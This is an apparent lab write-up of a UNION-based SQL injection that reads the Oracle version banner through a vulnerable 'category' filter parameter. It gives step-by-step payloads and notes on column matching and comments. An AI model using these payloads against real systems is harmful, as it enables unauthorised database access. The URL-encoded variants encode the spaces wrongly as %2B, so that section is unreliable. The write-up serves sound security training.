# SQL injection attack, querying the database type and version on Oracle

A concise write-up using **my original steps** (verbatim) with small, accurate notes and payload blocks.

---

## 🥅 Goal
**Discover the Oracle database version** by extracting from `v$version`.

---

## ✅ My Exact Steps (Verbatim)

1. **GOAL: we need to discover the database version, we already know its oracle. which make the extraction query being: `SELECT BANNER FROM v$version`**

2. **Finding the vulnerable parameter: `/filter?category='` -> provide status 500 internal server error**

3. **fixing the bug: `/filter?category='--;`**

4. **We know the default table in oracle is "DUAL".**

5. **We need to make diff query, to combine to query's we'll be using UNION**

6. **payload: `/filter?category='+UNION+SELECT+NULL+FROM+DUAL--;` -> this gives status 500.**

7. **Checking to see if the database returning more than one column: `/filter?category='+UNION+SELECT+NULL,NULL+FROM+DUAL--;` -> gives 200**

8. **Trying to extract the banner: `/filter?category='+UNION+SELECT+BANNER,NULL+FROM+v$version--;`**

---

## 🧠 Minimal Additions (Why This Works)

- **Oracle basics**: `SELECT ... FROM DUAL` is required when selecting constants without a table. Views like `v$version` already have a table source, so you **do not** add `FROM DUAL` there.
- **UNION requirements**: The injected `UNION SELECT` must match the **number of columns** and their **types** returned by the original query.  
  - Step 6 (1 column) ⇒ **500 error** → column count/type mismatch.  
  - Step 7 (2 columns) ⇒ **200 OK** → now the **count matches**.
- **Text column alignment**: `BANNER` is a **text** column. Placing it in a position that the app renders (e.g., the first column if the front-end prints it) reveals the version string. A filler `NULL` keeps the column count aligned.
- **Comments**: `--` comments out the rest of the line. Ensure a **space** after it (often encoded as `+`) when needed. Your `--;` works in many labs; a robust variant is `--+`.
- **URL encoding**: `+` is interpreted as a space in query strings; use `%20` for an explicit space if the server treats `+` differently.

---

## 🔧 Payloads I Used (Copy/Paste)

**As entered (human-readable):**
```txt
/filter?category='
/filter?category='--;
/filter?category='+UNION+SELECT+NULL+FROM+DUAL--;
/filter?category='+UNION+SELECT+NULL,NULL+FROM+DUAL--;
/filter?category='+UNION+SELECT+BANNER,NULL+FROM+v$version--;
```

**URL-encoded variants (safe in raw requests):**
```txt
/filter?category=%27
/filter?category=%27--%2B
/filter?category=%27%2BUNION%2BSELECT%2BNULL%2BFROM%2BDUAL--%2B
/filter?category=%27%2BUNION%2BSELECT%2BNULL%2CNULL%2BFROM%2BDUAL--%2B
/filter?category=%27%2BUNION%2BSELECT%2BBANNER%2CNULL%2BFROM%2Bv%24version--%2B
```

> Tip: If the app expects the textual column in a different index, try swapping positions (e.g., `NULL,BANNER`) to surface output.

---

## 🏁 Result
- `BANNER` textual rows from `v$version` are returned via the vulnerable endpoint, revealing the **Oracle database version**. ✅
